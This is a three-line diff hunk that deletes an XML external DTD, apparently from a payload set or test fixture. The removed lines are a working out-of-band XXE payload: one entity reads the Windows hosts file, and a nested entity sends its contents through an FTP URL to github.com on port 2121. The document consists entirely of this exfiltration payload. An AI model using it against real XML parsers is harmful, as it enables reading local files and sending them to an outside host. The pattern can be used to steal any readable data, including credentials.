@@ -1,3 +1,0 @@
-<!ENTITY % file SYSTEM "C:/WINDOWS/System32/drivers/etc/hosts">
-<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://github.com:2121/%file;'>">
-%all;
